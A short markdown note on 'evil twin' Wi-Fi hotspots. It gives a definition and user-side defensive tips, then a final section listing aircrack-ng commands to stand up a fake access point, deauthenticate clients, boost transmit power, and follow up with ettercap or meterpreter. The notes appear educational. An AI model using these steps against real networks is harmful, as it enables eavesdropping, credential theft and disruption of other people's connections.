# Evil Twin hotspots

## What ?

Definition from Wikipedia: 
```
An evil twin is a fraudulent Wi-Fi access point that appears to be legitimate but is set up to eavesdrop on wireless communications. The evil twin is the wireless LAN equivalent of the phishing scam.

This type of attack may be used to steal the passwords of unsuspecting users, either by monitoring their connections or by phishing, which involves setting up a fraudulent web site and luring people there.
```

- fraudulent Wi-Fi access point
- wireless LAN equivalent of phishing scam
- can be used to steal information

## What you can do to avoid man-in-the-middle attacks from evil twins



Always ask the establishment what the name of the official hotspot is.  This will prevent you from making incorrect assumptions and choose a malicious hotspot.

If the official hotspot you want to connect to has a key, try intentionally typing in the wrong key.  If the connection accepts the blatantly wrong key, it is most likely an evil twin.

Disable the “auto connect” or “auto join” functions for saved hotspots for all of your wireless devices.  This is good advice period. 

You should also manually disconnect from a hotspot every couple of hours and manually reconnect to your desired hotspot and type in the password to confirm the connection.

## replicating an evil twin hotspot
[source](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-creating-evil-twin-wireless-access-point-eavesdrop-data-0147919/)

- check whether the wireless card is operational
    `iwconfig`
- put wireless card into promiscuous mode
    `airmon-ng start wlan0`
- begin capturing traffic on the wireless card
    `airodump-ng mon0`
- Create a new AP  
    `airbase-ng -a BSSID --essid "ESSID" -c CH mon0`
- Deauthentication/ bumping the suspect off
    `aireplay-ng --deauth 0 -a BSSID`
- Boost the network power  
    `iwconfig wlan0 txpower 27`
- Following up on the running evil twin
    - ettercap
    - inject meterpreter
    - ...
